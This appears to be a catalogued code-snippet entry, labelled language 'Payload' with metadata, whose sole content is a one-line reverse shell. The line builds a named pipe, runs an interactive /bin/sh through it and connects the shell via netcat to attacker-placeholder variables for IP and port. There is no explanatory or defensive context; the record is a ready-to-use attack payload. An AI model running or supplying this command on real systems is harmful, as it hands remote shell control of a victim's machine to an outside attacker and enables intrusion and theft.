---
id: 830b1cfd-7eb1-4813-af3f-f6c431239077
type: code
language: Payload
verified: false
created_at: '2020-03-16T06:43:54.919763+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 830b1cfd

**Language**: Payload

```payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


